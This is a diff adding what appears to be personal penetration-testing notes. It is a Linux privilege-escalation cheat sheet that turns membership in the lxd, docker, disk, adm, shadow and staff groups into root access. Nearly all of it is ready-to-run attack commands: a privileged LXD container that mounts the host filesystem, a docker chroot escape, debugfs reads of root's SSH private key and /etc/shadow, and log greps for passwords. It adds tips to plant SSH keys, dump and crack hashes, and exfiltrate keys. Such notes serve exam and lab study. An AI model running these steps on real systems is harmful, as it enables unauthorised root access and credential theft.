@@ -1,0 +1,229 @@
+🔥 LXD / LXC Group Abuse → Root Access
+✅ Pre-check:
+
+bash
+Copy
+Edit
+id
+# Look for: lxd group
+LXD Logic: If user is in lxd, they can init a container as privileged, mount the host FS, and escape to root.
+
+🧪 Attack Flow:
+bash
+Copy
+Edit
+# 1. Confirm membership
+id | grep lxd
+
+# 2. Initialize LXD (if needed)
+lxd init  # Accept defaults (may error on bridge — okay)
+
+# 3. Import Alpine container
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+
+# 4. Init privileged container
+lxc init alpine r00t -c security.privileged=true
+
+# 5. Mount host filesystem
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+
+# 6. Start container
+lxc start r00t
+
+# 7. Escape to shell and root
+lxc exec r00t /bin/sh
+
+# 8. Browse host system as root
+cd /mnt/root/root
+cat /mnt/root/etc/shadow
+📌 Post-exploit: Add your SSH key, dump hashes, or grab creds.
+
+🐳 Docker Group → Root File Access
+✅ Pre-check:
+
+bash
+Copy
+Edit
+id | grep docker
+Docker Logic: If user is in docker, they can mount host / dir into a container.
+
+🧪 Attack Flow:
+bash
+Copy
+Edit
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+📌 You’re now in host OS as root.
+
+💽 Disk Group → Full Device Access
+✅ Pre-check:
+
+bash
+Copy
+Edit
+id | grep disk
+Disk Logic: Members of disk can access block devices like /dev/sda1 → full root-level read/write access.
+
+🧪 Attack Flow:
+bash
+Copy
+Edit
+sudo debugfs /dev/sda1
+Inside debugfs:
+
+bash
+Copy
+Edit
+cd /root/.ssh
+cat id_rsa
+📌 Exfiltrate SSH keys, shadow file, or drop your own.
+
+📝 ADM Group → Log Enumeration
+✅ Pre-check:
+
+bash
+Copy
+Edit
+id | grep adm
+ADM Logic: Can read /var/log/* — useful for grabbing creds from logs, sudo history, bash logs, or cron schedules.
+
+🔍 What to Look For:
+bash
+Copy
+Edit
+# Grab all readable logs
+find /var/log -type f -exec cat {} \; 2>/dev/null | grep -Ei 'pass|user|login|root'
+
+# Search for cron jobs
+cat /var/log/syslog | grep CRON
+
+# Search for sudo access or failed logins
+grep sudo /var/log/auth.log
+grep 'Failed password' /var/log/auth.log
+📌 Goal: Pivot to cronjob abuse, discover weak passwords, or misused commands.
+
+📋 Summary Flow – If Group = Then Attack
+markdown
+Copy
+Edit
+| Group     | Attack Path                                      | Priv Esc? |
+|-----------|--------------------------------------------------|-----------|
+| lxd       | Priv container + host FS mount                   | ✅        |
+| docker    | Mount `/` into container, chroot into it         | ✅        |
+| disk      | Use debugfs to browse/dev full FS                | ✅        |
+| adm       | Read /var/log for creds, cron, sudo, history     | 🔍        |
+
+
+🧠 ITTT – Privileged Group Enumeration & Abuse Flow (Linux, CPTS-style)
+markdown
+Copy
+Edit
+# 🧩 Privileged Group Abuse – ITTT Flow
+
+## 🔍 Step 1: Enumerate All Users
+```bash
+awk -F: '$3 >= 1000 {print $1}' /etc/passwd
+🔍 Step 2: For Each User, Run:
+bash
+Copy
+Edit
+id <username>
+🧠 IF user is in sudo
+➡️ THEN:
+
+Run sudo -l to list allowed commands
+
+Look for NOPASSWD entries or misconfigured binaries
+
+Abuse with GTFOBins if applicable
+
+🧠 IF user is in lxd
+➡️ THEN:
+
+Import Alpine image
+
+Start privileged container:
+
+bash
+Copy
+Edit
+lxc init alpine pwnbox -c security.privileged=true
+lxc config device add pwnbox host-root disk source=/ path=/mnt/root recursive=true
+lxc start pwnbox
+lxc exec pwnbox /bin/sh
+Navigate to /mnt/root/root or /mnt/root/etc/shadow
+
+🧠 IF user is in docker
+➡️ THEN:
+
+Spawn a container that mounts the host FS:
+
+bash
+Copy
+Edit
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt
+Now you’re root on the host inside Docker
+
+🧠 IF user is in adm
+➡️ THEN:
+
+Read all logs in /var/log
+
+Look for:
+
+Credentials in /var/log/auth.log, apache2/access.log
+
+Scheduled cron jobs
+
+Password resets or sudo activity
+
+🧠 IF user is in disk
+➡️ THEN:
+
+Access raw device data (i.e., /dev/sda1)
+
+Mount or use debugfs:
+
+bash
+Copy
+Edit
+debugfs /dev/sda1
+ls
+cat /etc/shadow
+🧠 IF user is in shadow
+➡️ THEN:
+
+Directly cat /etc/shadow for password hashes
+
+Offline crack them with john or hashcat
+
+🧠 IF user is in staff
+➡️ THEN:
+
+Typically means access to system-wide directories like /usr/local
+
+Look for writable scripts or binaries
+
+PATH hijack or postinstall abuse
+
+🧠 IF user is in a custom group like dev, backup, syslog
+➡️ THEN:
+
+Check what commands or cron jobs they run:
+
+bash
+Copy
+Edit
+grep dev /etc/crontab /etc/cron.*/* 2>/dev/null
+Look in /etc/rsyslog.conf, /opt/, and any group-owned scripts
+
+🛠 Useful Enumeration Helpers
+bash
+Copy
+Edit
+getent group | grep -E 'sudo|docker|adm|lxd|disk|shadow|staff'
+bash
+Copy
+Edit
+for user in $(awk -F: '$3 >= 1000 {print $1}' /etc/passwd); do id $user; done
+
+
